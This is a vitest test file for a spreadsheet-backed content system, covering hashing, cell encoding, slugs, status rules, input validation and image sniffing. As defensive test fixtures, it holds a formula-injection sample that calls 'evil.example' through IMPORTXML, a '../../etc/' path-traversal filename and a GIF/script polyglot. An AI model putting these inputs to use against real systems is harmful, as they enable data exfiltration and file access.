import { createHash } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { imageDimensions, sanitizeFilename, sniffImageMime } from './media';
import { decodeCell, decodeRow, encodeCell, encodeRow } from './schema/codec';
import { sheetHeaders } from './schema/sheets';
import type { Post } from './schema/types';
import { sha256Hex } from './sha256';
import { slugify, validateSlug } from './slug';
import { planTransition } from './status';
import { PAGE_INPUT, POST_INPUT, validateInput } from './validate';

describe('sha256Hex', () => {
  it.each(['', 'abc', 'a'.repeat(55), 'a'.repeat(56), 'a'.repeat(64), 'Halo 🚀 ünïcödé', 'x'.repeat(100_000)])(
    'matches node:crypto for %#',
    (input) => {
      expect(sha256Hex(input)).toBe(createHash('sha256').update(input, 'utf8').digest('hex'));
    },
  );
  it('hashes bytes', () => {
    const bytes = new Uint8Array([0, 1, 2, 255, 128]);
    expect(sha256Hex(bytes)).toBe(createHash('sha256').update(bytes).digest('hex'));
  });
});

describe('cell codec (TC-DATA-01/02/03)', () => {
  const samples = [
    '2026-01-01',
    '001',
    'TRUE',
    '1e5',
    '12:30',
    '=IMPORTXML("https://evil.example","//a")',
    '+1',
    '-1',
    '@SUM(A1)',
    "'quoted",
    '~tilde',
    '~=already',
    '\t=tab',
    'Halo 👋 ünïcödé 日本語',
    '',
  ];
  it.each(samples)('round-trips %j and never starts with a formula trigger', (value) => {
    const encoded = encodeCell(value);
    expect(encoded).not.toMatch(/^[=+\-@]/);
    expect(decodeCell(encoded)).toBe(value);
  });

  it('decodes typed rows by header name and reports corrupt rows', () => {
    const headers = [...sheetHeaders('Posts')].reverse();
    const post: Post = {
      id: '5f0c6c1e-7d4b-4c55-9a9a-2d1f2f8b0c11',
      title: '=1+1',
      slug: 'halo',
      content_markdown: '# Halo',
      excerpt: '',
      status: 'draft',
      author_name: '',
      category_id: null,
      tag_ids: [],
      cover_media_id: null,
      seo_title: '',
      seo_description: '',
      created_at: '2026-11-21T10:15:30.123Z',
      updated_at: '2026-11-21T10:15:30.123Z',
      created_by: 'admin@example.com',
      updated_by: 'admin@example.com',
      published_at: null,
      deleted_at: null,
      version: 1,
    };
    const row = encodeRow('Posts', headers, post);
    const decoded = decodeRow<Post>('Posts', headers, row);
    expect(decoded).toEqual({ ok: true, record: post });
    const corrupt = [...row];
    corrupt[headers.indexOf('version')] = 'abc';
    expect(decodeRow('Posts', headers, corrupt).ok).toBe(false);
  });
});

describe('slug', () => {
  it('slugifies with diacritics', () => {
    expect(slugify('  Héllo, Dunia! Ünïcödé — 2026  ')).toBe('hello-dunia-unicode-2026');
    expect(slugify('a'.repeat(150)).length).toBe(100);
  });
  it('validates pattern and reserved page slugs', () => {
    expect(validateSlug('ok-slug-1', 'post')).toBeNull();
    expect(validateSlug('Bad Slug', 'post')).not.toBeNull();
    expect(validateSlug('a--b', 'post')).not.toBeNull();
    expect(validateSlug('blog', 'page')).not.toBeNull();
    expect(validateSlug('blog', 'post')).toBeNull();
  });
});

describe('status transitions (§13.2)', () => {
  it.each([
    ['draft', 'published', true],
    ['published', 'published', true],
    ['published', 'draft', true],
    ['published', 'archived', true],
    ['draft', 'archived', false],
    ['archived', 'draft', false],
  ] as const)('%s -> %s allowed, publish=%s', (from, to, publish) => {
    expect(planTransition(from, to)).toMatchObject({ ok: true, startsPublish: publish });
  });
  it('rejects archived -> published', () => {
    expect(planTransition('archived', 'published').ok).toBe(false);
  });
});

describe('validateInput', () => {
  it('rejects unknown keys (TC-SEC-04)', () => {
    const { errors } = validateInput(POST_INPUT, { title: 'x', spreadsheet_id: 'abc' }, { partial: true });
    expect(errors.map((e) => e.code)).toContain('unknown_field');
  });
  it('enforces limits (TC-DATA-04)', () => {
    const ok = validateInput(POST_INPUT, { content_markdown: 'a'.repeat(40_000) }, { partial: true });
    expect(ok.errors).toHaveLength(0);
    const tooLong = validateInput(POST_INPUT, { content_markdown: 'a'.repeat(40_001) }, { partial: true });
    expect(tooLong.errors[0]?.code).toBe('too_long');
    const title = validateInput(POST_INPUT, { title: '   ' }, { partial: true });
    expect(title.errors[0]?.code).toBe('required');
  });
  it('requires fields on create and rejects reserved page slugs', () => {
    const missing = validateInput(POST_INPUT, {}, { partial: false, required: ['title'] });
    expect(missing.errors[0]?.field).toBe('title');
    const page = validateInput(PAGE_INPUT, { slug: 'admin' }, { partial: true, namespace: 'page' });
    expect(page.errors[0]?.code).toBe('invalid_slug');
  });
});

describe('media helpers', () => {
  it('sniffs magic bytes and rejects SVG/polyglots', () => {
    expect(sniffImageMime(new Uint8Array([0xff, 0xd8, 0xff, 0xe0]))).toBe('image/jpeg');
    const png = Uint8Array.from([
      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 1, 0, 0, 0, 0, 200,
    ]);
    expect(sniffImageMime(png)).toBe('image/png');
    expect(imageDimensions(png, 'image/png')).toEqual({ width: 256, height: 200 });
    expect(sniffImageMime(new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"/>'))).toBeNull();
    expect(sniffImageMime(new TextEncoder().encode('GIF89a<script>'))).toBe('image/gif');
  });
  it('sanitizes filenames', () => {
    expect(sanitizeFilename('../../etc/pässwd .png')).toBe('etc-passwd-.png');
    expect(sanitizeFilename('')).toBe('image');
  });
});
